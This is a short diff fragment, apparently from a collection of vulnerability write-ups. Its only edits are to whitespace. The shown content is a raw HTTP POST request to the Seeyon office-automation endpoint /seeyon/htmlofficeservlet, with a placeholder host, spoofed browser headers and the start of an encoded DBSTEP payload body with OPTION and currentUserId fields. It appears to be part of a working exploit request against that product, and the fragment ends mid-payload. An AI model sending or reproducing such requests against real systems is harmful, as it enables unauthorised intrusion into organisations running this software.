@@ -32,12 +32,12 @@ source: "MrWQ/vulnerability-paper"
 POST /seeyon/htmlofficeservlet HTTP/1.1
 Host: XXX
 Content-Length: 1251
- 
- 
+ 
+ 
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:67.0) Gecko/20100101 Firefox/67.0
 Pragma: no-cache
 Content-Length: 1122
- 
+ 
 DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
 OPTION=S3WYOSWLBSGr
 currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
